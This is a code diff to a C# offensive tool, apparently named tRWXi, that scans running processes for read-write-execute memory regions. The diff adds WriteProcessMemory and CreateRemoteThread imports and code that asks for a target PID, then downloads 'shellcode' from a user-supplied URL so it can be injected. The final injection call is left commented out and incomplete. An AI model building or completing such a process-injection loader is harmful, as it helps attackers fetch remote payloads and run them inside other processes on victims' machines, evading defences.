@@ -4,6 +4,9 @@ using System.Runtime.ConstrainedExecution;
 using System.Runtime.InteropServices;
 using System.Security;
 using System.Collections.Generic;
+using System.Linq.Expressions;
+using System.IO;
+using System.Text;
 
 namespace tRWXi
 {
@@ -59,11 +62,20 @@ namespace tRWXi
         static extern bool CloseHandle(IntPtr hObject);
 
         [DllImport("kernel32.dll")]
-        static extern uint GetLastError();
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,IntPtr lpThreadId);
+
+        private const Int32 TH32CS_SNAPPROCESS = 0x02;
+        private const Int32 PAGE_EXECUTE_READ_WRITE = 0x40;
+        private const Int32 MEM_COMMIT = 0x1000;
+        private const Int32 MEM_PRIVATE = 0x20000;
+        private const Int32 PROCESS_ALL_ACCESS = 0x001F0FFF;
 
         public static void Main(string[] args)
         {
-            Console.WriteLine("[+] Started enumeration");
+            Console.WriteLine("[!] Started enumeration");
 
             try
             {
@@ -74,7 +86,7 @@ namespace tRWXi
 
                 IntPtr lpAddress = IntPtr.Zero;
 
-                IntPtr hSnapshot = CreateToolhelp32Snapshot(0x00000002, 0); //SnapshotFlags 0x02 -> TH32CS_SNAPPROCESS
+                IntPtr hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
                 bool hResult = Process32First(hSnapshot, ref pe);
 
@@ -82,12 +94,13 @@ namespace tRWXi
 
                 while (hResult)
                 {
-                    IntPtr hProcess = OpenProcess(0x001F0FFF, false, (int) pe.th32ProcessID);
+                    IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, (int) pe.th32ProcessID);
                     while (VirtualQueryEx(hProcess, lpAddress, out mbi, Marshal.SizeOf(mbi)) != 0)
                     {
                         lpAddress = new IntPtr (mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
-                        if (mbi.AllocationProtect == 0x40 && mbi.State == 0x1000 && mbi.Type == 0x20000) // 0x40 -> PAGE_EXECUTE_READ_WRITE
+                        if (mbi.AllocationProtect == PAGE_EXECUTE_READ_WRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE) 
                         {
+                            Console.WriteLine("M: " + mbi.BaseAddress.ToString());
                             if (!processes.ContainsKey((int)pe.th32ProcessID))
                             {
                                 processes.Add((int) pe.th32ProcessID, pe.szExeFile);
@@ -103,6 +116,19 @@ namespace tRWXi
                 {
                     Console.WriteLine(String.Format("[+] Found RWX regions in PID: {0} -> {1}", pair.Key, pair.Value));
                 }
+
+                Console.Write("Provide a PID to inject your shellcode into >:");
+                int pid = (int) Int64.Parse(Console.ReadLine());
+                Console.Write("> Provide an URL to download the shellcode from >:");
+                string url = Console.ReadLine();
+                System.Net.WebClient client = new System.Net.WebClient();
+                Stream str = client.OpenRead(url);
+                StreamReader reader = new StreamReader(str);
+                string data = reader.ReadToEnd();
+                byte[] shellcode = Encoding.ASCII.GetBytes(data);
+                Console.WriteLine(shellcode.ToString());
+                //WriteProcessMemory(OpenProcess(PROCESS_ALL_ACCESS, false, pid), );
+
             }
             catch (Exception ex)
             {
